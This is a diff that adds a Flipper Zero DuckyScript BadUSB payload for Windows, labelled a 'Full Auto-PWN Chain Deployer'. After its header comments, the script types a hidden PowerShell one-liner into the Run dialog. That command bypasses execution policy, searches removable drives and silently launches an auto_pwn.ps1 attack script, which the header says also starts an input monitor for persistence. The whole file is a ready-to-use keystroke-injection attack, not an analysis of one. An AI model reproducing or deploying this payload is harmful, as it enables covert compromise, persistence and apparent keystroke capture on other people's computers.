@@ -1,0 +1,28 @@
+﻿REM ============================================================================
+REM  FLLC — BadUSB: Full Auto-PWN Chain Deployer
+REM  Flipper Zero DuckyScript
+REM ============================================================================
+REM  Target: Windows 10/11
+REM  Time: ~6 seconds total
+REM  
+REM  This deploys AND executes the full attack pipeline:
+REM    1. Opens hidden PowerShell
+REM    2. Detects the Micro SD drive letter
+REM    3. Launches auto_pwn.ps1 from the Micro SD
+REM    4. Starts input monitor for persistence
+REM    5. All in one shot, fully silent
+REM
+REM  PREREQUISITES:
+REM    - Micro SD card (I:) must be inserted with payloads/ directory
+REM    - Or any removable drive with the payload structure
+REM ============================================================================
+
+DELAY 1000
+REM Open Run dialog
+GUI r
+DELAY 600
+
+REM One-liner: Find the USB drive with payloads, launch auto_pwn.ps1 hidden
+STRING powershell -W Hidden -NoP -NonI -Exec Bypass -C "$d=Get-WmiObject Win32_LogicalDisk|?{$_.DriveType-eq2}|%{$_.DeviceID};foreach($x in $d){if(Test-Path \"$x\payloads\auto_pwn.ps1\"){Start-Process powershell -Arg '-W Hidden -NoP -Exec Bypass -F',\"`\"$x\payloads\auto_pwn.ps1`\"\" -WindowStyle Hidden;break}}"
+ENTER
+DELAY 500
